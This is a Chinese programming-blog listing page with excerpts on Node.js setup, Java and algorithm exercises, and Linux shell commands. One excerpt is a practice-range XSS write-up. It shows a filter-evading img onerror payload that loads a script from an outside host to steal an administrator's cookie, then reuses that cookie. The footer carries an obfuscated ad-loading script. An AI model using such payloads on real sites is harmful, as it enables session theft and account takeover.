sudo yum update 安装完成 【3】安装 Node.js 通过以下是不同操作系统上的安装步骤。
在 Ubuntu/Debian 上：
sudo apt install nodejs 在 CentOS/RHEL 上：
sudo yum install nodejs 注意：通过此方法安装的 Node.js 可能并不是最新版本。如果需要特定的 Node.js 版本，可以使用 Node 版本管理工具(如 nvm 或 n)进行安装。 安装完成 验证 Node.js 安装：
运行以下命令，确认 Node.js 是否正确安装并查看版本号。 node -v 安装 npm：
npm 是 Node.js 的包管理工具，也会随 Node.js 一起安装。再次运行验证命令来确认 npm 安装是否成功。 npm -v 【4】安装MongoDB(2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0af39695a988dfc3205f1219288731d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63397598a797522f58ccc0a26cc7559f/" rel="bookmark">
			FuzzBuzz算法问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java实现输入一个字符串，5:hogera 3:piyo 2:huga 30 按空格分隔为map。
例如，key为数字5，value为字符串hogera，
当最后的数字满足，30=532时，按照key的从小到达的顺序拼接字符串输出hugapiyohogera
当最后的数字数字满足其中一个key时，使出对应的value。
都不满足，直接输出最后一个数字
输入：5:hogera 3:piyo 2:huga 30
输出：hugapiyohogera
输入：5:hogera 3:piyo 2:huga 3
输出：piyo
输入：5:hogera 3:piyo 2:huga 33
输出：33
** TreeMap可以实现自动排序
import java.util.*; public class Chocolate { public static void main(String[] args) { String[] lines = getStdin(); Map&lt;Integer, String&gt; map = new TreeMap&lt;&gt;(); //分割空格得到字符串数组 String[] parts = lines[0].split("\\s+"); //遍历字符串数组存入map，除了最后一位 int lastNum = Integer.parseInt(parts[parts.length - 1]); for (int j = 0; j &lt; parts.length - 1; j++) { String[] keyValue = parts[j].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63397598a797522f58ccc0a26cc7559f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2caf26cf5cced7813573a22936774fab/" rel="bookmark">
			安鸾靶场XSS挖掘&amp;绕过
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		传统方法试一下,发现scirp标签被过滤掉了
&lt;script&gt;alert("xss");&lt;/script&gt;
直接换一种标签接着测肯能不能弹窗
&lt;img src=1 οnerrοr=alert("xss");&gt;
使用&lt;img&gt;标签时弹窗了,说明没有对img标签进行过滤
自己构造一个img标签的js代码,让管理员带着cookie来见我
&lt;img src=x οnerrοr=s=createElement('script');body.appendChild(s);s.src='http://vpn.whalwl.work:18080/5GlYEi?1690861593';&gt;
没注意到上面的语句还有一个'scirp',导致被过滤,js语法错误
重新构造,给scirp转码绕过
&lt;img src=x οnerrοr=s=createElement('\u0073\u0063\u0072\u0069\u0070\u0074');body.appendChild(s);s.src='http://vpn.whalwl.work:18080/5GlYEi?1690861593';&gt;
绕过成功了 发现有三个必要参数,cookie,roc_login,roc_secure
把这三个弄到小饼干上,盲猜一波管理员网站的地址是admin,http://106.15.50.112:8013/admin
回车
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aefdfcafd5789afa366527ce7ea5ea95/" rel="bookmark">
			对boostrap的模态框进行动态追加，高度不能自适应问题（float高度不能自适应问题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现情况
解决后效果
解决代码
在父级的div末尾追加
&lt;div style="clear:both;"&gt;&lt;/div&gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6dd1a9bcdcd3aefb0d1670f1fdd4823/" rel="bookmark">
			linux shell 总结命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前情提要：
引用：
一、文件比较运算符 二、字符串比较运算符
三、算术比较运算符 四、查看磁盘、文件大小 五、模仿浏览器请求curl
六、文件下载或数据请求
七、循环和判断语句
八、内容写入日志文件echo 九、休眠sleep 与定时crontab
十、备份（压缩/解压）
十一、文件操作
十二、nohup不挂断的运行
十三、linux shell使用expect实现sftp的自动交互
十四、文件和目录 十五、文件搜索 十六、端口查杀
十七、文件权限chmod
十八、分发文件scp
十九、VI常用命令
二十、设置脚本执行环境
二十一、执行错误 $'\r':command not found
1，,替换
2，将换行符设置成UNIX的模式
二十二、查看应用所有端口号
二十三、问题记录
（一），cp omitting directory
1，问题描述
2.1，目标文件多级
2.2，目地文件多级
3，总结
前情提要： 一直想避免写脚本，但是往往你不想做的事情会成为你的绊脚石，winods,linux脚本都在不断接触，每次都要重新搜索。
既然逃不掉，那就去迎接，准备把之前零散写的汇聚起来，方便自己后期查看，形成体系。
摘抄会有注明路径,持续更新...
引用： 前六部分内容原贴地址
linux shell 文件比较、字符串比较、算数等常用指令_一只没有脚的鸟-CSDN博客
一、文件比较运算符 1. e filename 如果 filename存在，则为真 如： [ -e /var/log/syslog ] 2. -d filename 如果 filename为目录，则为真 如： [ -d /tmp/mydir ] 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6dd1a9bcdcd3aefb0d1670f1fdd4823/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00704c100eff9919041024fc66065275/" rel="bookmark">
			滑动窗口例题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.适合解决的题目类型 滑动窗口，可以用来解决一些查找满足一定条件的连续区间的性质（长度等）的问题。由于区间连续，因此当区间发生变化时，可以通过旧有的计算结果对搜索空间进行剪枝，这样便减少了重复计算，降低了时间复杂度。往往类似于“请找到满足xx的最x的区间（子串、子数组）的xx”这类问题都可以使用该方法进行解决。
2.例题 面试题 17.18. 最短超串
主要思想就是先用右指针去寻找覆盖了子串的母串部分，然后滑动左侧边界，直到不满足覆盖条件。
代码及注释如下
class Solution { public int[] shortestSeq(int[] big, int[] small) { //左右双指针表示滑动窗口，start和min用来保存最优解 int left = 0,right = 0,start = 0; int min = Integer.MAX_VALUE; //window用来记录当前窗口包含的字符和出现的次数 //needs用来记录small当中出现的字符和包含的次数 HashMap&lt;Integer,Integer&gt; window = new HashMap&lt;&gt;(); HashMap&lt;Integer,Integer&gt; needs = new HashMap&lt;&gt;(); //记录small中出现的字符和包含的次数 for(Integer c:small ) needs.put(c,needs.getOrDefault(c,0)+1); //match用来保存匹配的个数 int match = 0; //移动right扩大窗口 while(right&lt;big.length){ Integer c1 = big[right]; if(needs.containsKey(c1)){ window.put(c1,window.getOrDefault(c1,0)+1); if(window.get(c1)==needs.get(c1)){ match++; } } right++; //当匹配个数满足small时，移动 left 缩小窗口进行优化 while (match==needs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00704c100eff9919041024fc66065275/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4e16fed5bcdff4b2f2ddeef868ba07d/" rel="bookmark">
			linux环境下运行脚本时常用＞/dev/null 2＞&amp;1 &amp;这一串的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 大雨哗哗哗，叫车无人接，把最近用到的命令总结一下，方便日后的拿来主义。
&gt;/dev/null 2&gt;&amp;1 &gt;/dev/null 2&gt;&amp;1 &amp; 是一个常见的 Shell 命令行用法，用于在 Linux 或类 Unix 系统上运行一个程序并将其输出（标准输出和标准错误输出）重定向到 /dev/null，同时将程序在后台（background）运行。
接下来可以逐步解释下各部分的作用：
&gt;：重定向符号，用于将输出重定向到指定的文件或设备。
/dev/null：在 Unix 系统上，/dev/null 是一个特殊的设备文件，它会将所有写入它的内容都丢弃，相当于一个空黑洞。将输出重定向到 /dev/null 就意味着将输出丢弃，不会显示在终端或记录到文件中。
2&gt;：重定向标准错误输出的符号。2 表示标准错误流，也称为文件描述符 2。
&amp;1：将标准错误输出重定向到标准输出的符号。&amp;1 表示文件描述符 1，而标准输出的文件描述符也是 1。这样，就将标准错误输出和标准输出合并到一起，都重定向到了 /dev/null。
&amp;：在命令行中，&amp; 符号用于将命令置于后台运行，使得当前终端可以继续输入其他命令，而不需要等待前台命令的完成。
综合起来，&gt;/dev/null 2&gt;&amp;1 &amp; 的作用是将某个程序在后台运行，并将其标准输出和标准错误输出都丢弃，不在终端中显示或记录。这样做常常用于运行不需要显示输出的程序或脚本，并且让它在后台运行，不占用终端的输入输出。
去除文件夹下所有文本文件的行末空格 想要达到这个目的有多种实现方式，比如：
find . -type f -exec egrep -l " +$" {} \; | grep -v xxx | xargs sed -i 's/[ ]*$//g' 再比如：
find xxx -type f -name "*.txt" -exec sed -i 's/[ \t]*$//' {} \; 主要部分的含义：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4e16fed5bcdff4b2f2ddeef868ba07d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/58/">«</a>
	<span class="pagination__item pagination__item--current">59/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/60/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>